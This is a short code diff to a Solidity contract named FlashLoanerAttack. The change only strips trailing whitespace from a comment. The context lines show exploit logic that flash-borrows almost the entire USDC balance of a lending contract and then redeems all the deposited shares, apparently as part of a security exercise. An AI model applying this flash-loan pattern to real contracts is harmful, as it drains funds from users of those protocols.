@@ -32,7 +32,7 @@ contract FlashLoanerAttack {
         uint256 flashAmount = usdc.balanceOf(address(flashLoaner)) - 1;
         flashLoaner.flash({recipient: address(this), amount: flashAmount, data: ""});
 
-        // redeem all of deposited flash loaned amount 
+        // redeem all of deposited flash loaned amount
         uint256 redeemAmount = flashLoaner.balanceOf(address(this));
         flashLoaner.redeem({shares: redeemAmount, receiver: address(this), owner: address(this)});
 
